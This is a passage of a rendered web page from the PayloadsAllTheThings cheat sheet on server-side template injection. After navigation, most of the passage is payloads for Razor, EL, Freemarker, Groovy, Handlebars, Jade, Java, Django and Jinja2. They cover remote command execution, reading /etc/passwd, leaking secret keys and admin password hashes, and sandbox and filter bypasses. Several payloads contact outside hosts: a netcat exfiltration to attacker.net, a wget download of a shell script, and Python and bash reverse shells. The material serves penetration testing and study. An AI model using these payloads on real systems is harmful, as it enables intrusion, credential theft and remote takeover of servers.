+    Lessjs
+  </a>
+  
+    <nav class="md-nav" aria-label="Lessjs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lessjs-ssrf-lfi" class="md-nav__link">
+    Lessjs - SSRF / LFI
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lessjs-v3-command-execution" class="md-nav__link">
+    Lessjs &lt; v3 - Command Execution
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#plugins" class="md-nav__link">
+    Plugins
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mako" class="md-nav__link">
+    Mako
+  </a>
+  
+    <nav class="md-nav" aria-label="Mako">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#direct-access-to-os-from-templatenamespace" class="md-nav__link">
+    Direct access to os from TemplateNamespace:
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pebble" class="md-nav__link">
+    Pebble
+  </a>
+  
+    <nav class="md-nav" aria-label="Pebble">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pebble-basic-injection" class="md-nav__link">
+    Pebble - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pebble-code-execution" class="md-nav__link">
+    Pebble - Code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ruby" class="md-nav__link">
+    Ruby
+  </a>
+  
+    <nav class="md-nav" aria-label="Ruby">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ruby-basic-injections" class="md-nav__link">
+    Ruby - Basic injections
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-retrieve-etcpasswd" class="md-nav__link">
+    Ruby - Retrieve /etc/passwd
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-list-files-and-directories" class="md-nav__link">
+    Ruby - List files and directories
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ruby-code-execution" class="md-nav__link">
+    Ruby - Code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smarty" class="md-nav__link">
+    Smarty
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#twig" class="md-nav__link">
+    Twig
+  </a>
+  
+    <nav class="md-nav" aria-label="Twig">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#twig-basic-injection" class="md-nav__link">
+    Twig - Basic injection
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-template-format" class="md-nav__link">
+    Twig - Template format
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-arbitrary-file-reading" class="md-nav__link">
+    Twig - Arbitrary File Reading
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#twig-code-execution" class="md-nav__link">
+    Twig - Code execution
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#velocity" class="md-nav__link">
+    Velocity
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/edit/master/Server Side Template Injection/README.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="templates-injections">Templates Injections</h1>
+<blockquote>
+<p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
+</blockquote>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#templates-injections">Templates Injections</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#tools">Tools</a></li>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#aspnet-razor">ASP.NET Razor</a><ul>
+<li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
+<li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
+</ul>
+</li>
+<li><a href="#expression-language-el">Expression Language EL</a><ul>
+<li><a href="#expression-language-el---basic-injection">Expression Language EL - Basic injection</a></li>
+<li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
+<li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
+</ul>
+</li>
+<li><a href="#freemarker">Freemarker</a><ul>
+<li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
+<li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
+<li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
+<li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
+</ul>
+</li>
+<li><a href="#groovy">Groovy</a><ul>
+<li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
+<li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
+<li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
+<li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
+<li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
+</ul>
+</li>
+<li><a href="#handlebars">Handlebars</a><ul>
+<li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
+</ul>
+</li>
+<li><a href="#jade--codepen">Jade / Codepen</a></li>
+<li><a href="#java">Java</a><ul>
+<li><a href="#java---basic-injection">Java - Basic injection</a></li>
+<li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
+<li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
+</ul>
+</li>
+<li><a href="#django-template">Django Template</a></li>
+<li><a href="#jinja2">Jinja2</a><ul>
+<li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
+<li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
+<li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
+<li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
+<li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
+<li><a href="#jinja2---read-remote-file">Jinja2 - Read remote file</a></li>
+<li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
+<li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a></li>
+<li><a href="#exploit-the-ssti-by-calling-ospopenread">Exploit the SSTI by calling os.popen().read()</a></li>
+<li><a href="#exploit-the-ssti-by-calling-subprocesspopen">Exploit the SSTI by calling subprocess.Popen</a></li>
+<li><a href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset">Exploit the SSTI by calling Popen without guessing the offset</a></li>
+<li><a href="#exploit-the-ssti-by-writing-an-evil-config-file">Exploit the SSTI by writing an evil config file.</a></li>
+<li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
+</ul>
+</li>
+<li><a href="#jinjava">Jinjava</a><ul>
+<li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
+<li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
+</ul>
+</li>
+<li><a href="#lessjs">Lessjs</a><ul>
+<li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
+<li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
+<li><a href="#plugins">Plugins</a></li>
+</ul>
+</li>
+<li><a href="#mako">Mako</a><ul>
+<li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
+</ul>
+</li>
+<li><a href="#pebble">Pebble</a><ul>
+<li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
+<li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
+</ul>
+</li>
+<li><a href="#ruby">Ruby</a><ul>
+<li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
+<li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
+<li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
+<li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
+</ul>
+</li>
+<li><a href="#smarty">Smarty</a></li>
+<li><a href="#twig">Twig</a><ul>
+<li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
+<li><a href="#twig---template-format">Twig - Template format</a></li>
+<li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
+<li><a href="#twig---code-execution">Twig - Code execution</a></li>
+</ul>
+</li>
+<li><a href="#velocity">Velocity</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="tools">Tools</h2>
+<p>Recommended tool: <a href="https://github.com/epinna/tplmap">Tplmap</a>
+e.g:</p>
+<pre><code class="language-powershell">python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
+python2.7 ./tplmap.py -u &quot;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&quot;
+python2.7 ./tplmap.py -u &quot;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&quot; --level 5 -e jade
+</code></pre>
+<h2 id="methodology">Methodology</h2>
+<p><img alt="SSTI cheatsheet workflow" src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true" /></p>
+<hr />
+<h2 id="detection">Detection</h2>
+<p>In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :</p>
+<pre><code>${{&lt;%[%'&quot;}}%\.
+</code></pre>
+<h2 id="aspnet-razor">ASP.NET Razor</h2>
+<p><a href="https://docs.microsoft.com/en-us/aspnet/web-pages/overview/getting-started/introducing-razor-syntax-c">Official website</a></p>
+<blockquote>
+<p>Razor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.</p>
+</blockquote>
+<h3 id="aspnet-razor-basic-injection">ASP.NET Razor - Basic injection</h3>
+<pre><code class="language-powershell">@(1+2)
+</code></pre>
+<h3 id="aspnet-razor-command-execution">ASP.NET Razor - Command execution</h3>
+<pre><code class="language-csharp">@{
+  // C# code
+}
+</code></pre>
+<hr />
+<h2 id="expression-language-el">Expression Language EL</h2>
+<p><a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html">Official website</a></p>
+<blockquote>
+<p>Expression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0</p>
+</blockquote>
+<h3 id="expression-language-el-basic-injection">Expression Language EL - Basic injection</h3>
+<pre><code class="language-java">${1+1}
+#{1+1}
+</code></pre>
+<h3 id="expression-language-el-one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</h3>
+<pre><code class="language-java">// DNS Lookup
+${&quot;&quot;.getClass().forName(&quot;java.net.InetAddress&quot;).getMethod(&quot;getByName&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;,&quot;xxxxxxxxxxxxxx.burpcollaborator.net&quot;)}
+
+// JVM System Property Lookup (ex: java.class.path)
+${&quot;&quot;.getClass().forName(&quot;java.lang.System&quot;).getDeclaredMethod(&quot;getProperty&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;,&quot;java.class.path&quot;)}
+</code></pre>
+<h3 id="expression-language-el-code-execution">Expression Language EL - Code Execution</h3>
+<pre><code class="language-java">// Common RCE payloads
+''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(&lt;COMMAND STRING/ARRAY&gt;)
+''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(&lt;COMMAND ARRAY/LIST&gt;).start()
+
+// Method using Runtime
+#{session.setAttribute(&quot;rtc&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getDeclaredConstructors()[0])}
+#{session.getAttribute(&quot;rtc&quot;).setAccessible(true)}
+#{session.getAttribute(&quot;rtc&quot;).getRuntime().exec(&quot;/bin/bash -c whoami&quot;)}
+
+// Method using process builder
+${request.setAttribute(&quot;c&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}
+${request.getAttribute(&quot;c&quot;).add(&quot;cmd.exe&quot;)}
+${request.getAttribute(&quot;c&quot;).add(&quot;/k&quot;)}
+${request.getAttribute(&quot;c&quot;).add(&quot;ping x.x.x.x&quot;)}
+${request.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getDeclaredConstructors()[0].newInstance(request.getAttribute(&quot;c&quot;)).start())}
+${request.getAttribute(&quot;a&quot;)}
+
+// Method using Reflection &amp; Invoke
+${&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethods()[6].invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)).exec(&quot;calc.exe&quot;)}
+
+// Method using ScriptEngineManager one-liner
+${request.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(\\\&quot;ping x.x.x.x\\\&quot;)&quot;))}
+
+// Method using ScriptEngineManager
+${facesContext.getExternalContext().setResponseHeader(&quot;output&quot;,&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(\&quot;var x=new java.lang.ProcessBuilder;x.command(\\\&quot;wget\\\&quot;,\\\&quot;http://x.x.x.x/1.sh\\\&quot;);org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;))}
+</code></pre>
+<hr />
+<h2 id="freemarker">Freemarker</h2>
+<p><a href="https://freemarker.apache.org/">Official website</a></p>
+<blockquote>
+<p>Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data. </p>
+</blockquote>
+<p>You can try your payloads at <a href="https://try.freemarker.apache.org">https://try.freemarker.apache.org</a></p>
+<h3 id="freemarker-basic-injection">Freemarker - Basic injection</h3>
+<p>The template can be <code>${3*3}</code> or the legacy <code>#{3*3}</code>.</p>
+<h3 id="freemarker-read-file">Freemarker - Read File</h3>
+<pre><code class="language-js">${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(&quot; &quot;)}
+Convert the returned bytes to ASCII
+</code></pre>
+<h3 id="freemarker-code-execution">Freemarker - Code execution</h3>
+<pre><code class="language-js">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;${ ex(&quot;id&quot;)}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)}
+</code></pre>
+<h3 id="freemarker-sandbox-bypass">Freemarker - Sandbox bypass</h3>
+<p>:warning: only works on Freemarker versions below 2.3.30</p>
+<pre><code class="language-js">&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;
+&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;
+&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;
+&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;
+${dwf.newInstance(ec,null)(&quot;id&quot;)}
+</code></pre>
+<hr />
+<h2 id="groovy">Groovy</h2>
+<p><a href="https://groovy-lang.org/">Official website</a></p>
+<h3 id="groovy-basic-injection">Groovy - Basic injection</h3>
+<p>Refer to https://groovy-lang.org/syntax.html , but <code>${9*9}</code> is the basic injection.</p>
+<h3 id="groovy-read-and-create-file">Groovy - Read and create File</h3>
+<pre><code class="language-groovy">${String x = new File('c:/windows/notepad.exe').text}
+${String x = new File('/path/to/file').getText('UTF-8')}
+${new File(&quot;C:\Temp\FileName.txt&quot;).createNewFile();}
+</code></pre>
+<h3 id="groovy-http-request">Groovy - HTTP request:</h3>
+<pre><code class="language-groovy">${&quot;http://www.google.com&quot;.toURL().text}
+${new URL(&quot;http://www.google.com&quot;).getText()}
+</code></pre>
+<h3 id="groovy-command-execution">Groovy - Command Execution</h3>
+<pre><code class="language-groovy">${&quot;calc.exe&quot;.exec()}
+${&quot;calc.exe&quot;.execute()}
+${this.evaluate(&quot;9*9&quot;) //(this is a Script class)}
+${new org.codehaus.groovy.runtime.MethodClosure(&quot;calc.exe&quot;,&quot;execute&quot;).call()}
+</code></pre>
+<h3 id="groovy-sandbox-bypass">Groovy - Sandbox Bypass</h3>
+<pre><code class="language-groovy">${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(&quot;whoami&quot;)})
+def x }
+</code></pre>
+<p>or</p>
+<pre><code class="language-groovy">${ new groovy.lang.GroovyClassLoader().parseClass(&quot;@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)})def x&quot;) }
+</code></pre>
+<hr />
+<h2 id="handlebars">Handlebars</h2>
+<p><a href="https://handlebarsjs.com/">Official website</a></p>
+<blockquote>
+<p>Handlebars compiles templates into JavaScript functions.</p>
+</blockquote>
+<h3 id="handlebars-command-execution">Handlebars - Command Execution</h3>
+<pre><code class="language-handlebars">{{#with &quot;s&quot; as |string|}}
+  {{#with &quot;e&quot;}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub &quot;constructor&quot;)}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push &quot;return require('child_process').execSync('ls -la');&quot;}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+</code></pre>
+<hr />
+<h2 id="jade-codepen">Jade / Codepen</h2>
+<p><a href="https://codepen.io/">Official website</a></p>
+<blockquote></blockquote>
+<pre><code class="language-python">- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.net 80')
+</code></pre>
+<pre><code class="language-javascript">#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+</code></pre>
+<hr />
+<h2 id="java">Java</h2>
+<h3 id="java-basic-injection">Java - Basic injection</h3>
+<blockquote>
+<p>Multiple variable expressions can be used, if <code>${...}</code> doesn't work try <code>#{...}</code>, <code>*{...}</code>, <code>@{...}</code> or <code>~{...}</code>.</p>
+</blockquote>
+<pre><code class="language-java">${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource(&quot;&quot;).getPath()}
+${class.getResource(&quot;../../../../../index.htm&quot;).getContent()}
+</code></pre>
+<h3 id="java-retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</h3>
+<pre><code class="language-java">${T(java.lang.System).getenv()}
+</code></pre>
+<h3 id="java-retrieve-etcpasswd">Java - Retrieve /etc/passwd</h3>
+<pre><code class="language-java">${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
+</code></pre>
+<hr />
+<h2 id="django-templates">Django Templates</h2>
+<p>Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.</p>
+<h3 id="detection_1">Detection</h3>
+<pre><code class="language-python">{% csrf_token %} # Causes error with Jinja2
+{{ 7*7 }}  # Error with Django Templates
+ih0vr{{364|add:733}}d121r # Burp Payload -&gt; ih0vr1097d121r
+</code></pre>
+<h3 id="django-templates-for-post-exploitation">Django Templates for post-exploitation</h3>
+<pre><code class="language-python"># Variables
+{{ variable }}
+{{ variable.attr }}
+
+# Filters
+{{ value|length }}
+
+# Tags
+{% csrf_token %}
+</code></pre>
+<h3 id="cross-site-scripting">Cross-site scripting</h3>
+<pre><code class="language-python">{{ '&lt;script&gt;alert(3)&lt;/script&gt;' }}
+{{ '&lt;script&gt;alert(3)&lt;/script&gt;' | safe }}
+</code></pre>
+<h3 id="debug-information-leak">Debug information leak</h3>
+<pre><code class="language-python">{% debug %}
+</code></pre>
+<h3 id="leaking-apps-secret-key">Leaking app’s Secret Key</h3>
+<pre><code class="language-python">{{ messages.storages.0.signer.key }}
+</code></pre>
+<h3 id="admin-site-url-leak">Admin Site URL leak</h3>
+<pre><code>{% include 'admin/base.html' %}
+</code></pre>
+<h3 id="admin-username-and-password-hash-leak">Admin username and password hash leak</h3>
+<pre><code>{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+</code></pre>
+<h2 id="jinja2">Jinja2</h2>
+<p><a href="https://jinja.palletsprojects.com/">Official website</a></p>
+<blockquote>
+<p>Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  </p>
+</blockquote>
+<h3 id="jinja2-basic-injection">Jinja2 - Basic injection</h3>
+<pre><code class="language-python">{{4*4}}[[5*5]]
+{{7*'7'}} would result in 7777777
+{{config.items()}}
+</code></pre>
+<p>Jinja2 is used by Python Web Frameworks such as Django or Flask.
+The above injections have been tested on a Flask application.</p>
+<h3 id="jinja2-template-format">Jinja2 - Template format</h3>
+<pre><code class="language-python">{% extends &quot;layout.html&quot; %}
+{% block body %}
+  &lt;ul&gt;
+  {% for user in users %}
+    &lt;li&gt;&lt;a href=&quot;{{ user.url }}&quot;&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;
+  {% endfor %}
+  &lt;/ul&gt;
+{% endblock %}
+
+</code></pre>
+<h3 id="jinja2-debug-statement">Jinja2 - Debug Statement</h3>
+<p>If the Debug Extension is enabled, a <code>{% debug %}</code> tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.</p>
+<pre><code class="language-python">&lt;pre&gt;{% debug %}&lt;/pre&gt;
+</code></pre>
+<p>Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement</p>
+<h3 id="jinja2-dump-all-used-classes">Jinja2 - Dump all used classes</h3>
+<pre><code class="language-python">{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+</code></pre>
+<h3 id="jinja2-dump-all-config-variables">Jinja2 - Dump all config variables</h3>
+<pre><code class="language-python">{% for key, value in config.iteritems() %}
+    &lt;dt&gt;{{ key|e }}&lt;/dt&gt;
+    &lt;dd&gt;{{ value|e }}&lt;/dd&gt;
+{% endfor %}
+</code></pre>
+<h3 id="jinja2-read-remote-file">Jinja2 - Read remote file</h3>
+<pre><code class="language-python"># ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](&quot;/tmp/flag&quot;).read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open(&quot;/etc/passwd&quot;).read() }}
+</code></pre>
+<h3 id="jinja2-write-into-remote-file">Jinja2 - Write into remote file</h3>
+<pre><code class="language-python">{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+</code></pre>
+<h3 id="jinja2-remote-code-execution">Jinja2 - Remote Code Execution</h3>
+<p>Listen for connection</p>
+<pre><code class="language-bash">nc -lnvp 8000
+</code></pre>
+<h4 id="exploit-the-ssti-by-calling-ospopenread">Exploit the SSTI by calling os.popen().read()</h4>
+<p>These payloads are context-free, and do not require anything, except being in a jinja2 Template object:</p>
+<pre><code class="language-python">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+</code></pre>
+<p>We can use these shorter payloads (this is the shorter payloads known yet):</p>
+<pre><code class="language-python">{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+</code></pre>
+<p>Source <a href="https://twitter.com/podalirius_">@podalirius_</a> : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/</p>
+<h4 id="exploit-the-ssti-by-calling-subprocesspopen">Exploit the SSTI by calling subprocess.Popen</h4>
+<p>:warning: the number 396 will vary depending of the application.</p>
+<pre><code class="language-python">{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+</code></pre>
+<h4 id="exploit-the-ssti-by-calling-popen-without-guessing-the-offset">Exploit the SSTI by calling Popen without guessing the offset</h4>
+<pre><code class="language-python">{% for x in ().__class__.__base__.__subclasses__() %}{% if &quot;warning&quot; in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(&quot;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/cat\&quot;, \&quot;flag.txt\&quot;]);'&quot;).read().zfill(417)}}{%endif%}{% endfor %}
+</code></pre>
+<p>Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+In another GET parameter include a variable named "input" that contains the command you want to run (For example: &amp;input=ls)</p>
+<pre><code class="language-python">{% for x in ().__class__.__base__.__subclasses__() %}{% if &quot;warning&quot; in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+</code></pre>
+<h4 id="exploit-the-ssti-by-writing-an-evil-config-file">Exploit the SSTI by writing an evil config file.</h4>
+<pre><code class="language-python"># evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&quot;',shell=True) }}
+</code></pre>
+<h3 id="jinja2-filter-bypass">Jinja2 - Filter bypass</h3>
+<pre><code class="language-python">request.__class__
+request[&quot;__class__&quot;]
+</code></pre>
+<p>Bypassing <code>_</code></p>
+<pre><code class="language-python">http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;class=class&amp;usc=_
+
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr([&quot;_&quot;*2,&quot;class&quot;,&quot;_&quot;*2]|join)}}
+{{request|attr([&quot;__&quot;,&quot;class&quot;,&quot;__&quot;]|join)}}
+{{request|attr(&quot;__class__&quot;)}}
+{{request.__class__}}
+</code></pre>
+<p>Bypassing <code>[</code> and <code>]</code></p>
+<pre><code class="language-python">http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_
+or
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_
+</code></pre>
+<p>Bypassing <code>|join</code></p>
+<pre><code class="language-python">http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_
+</code></pre>
+<p>Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:</p>
+<pre><code class="language-python">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+</code></pre>
+<hr />
+<h2 id="jinjava">Jinjava</h2>
+<p><a href="https://github.com/HubSpot/jinjava">Official website</a></p>
+<blockquote>
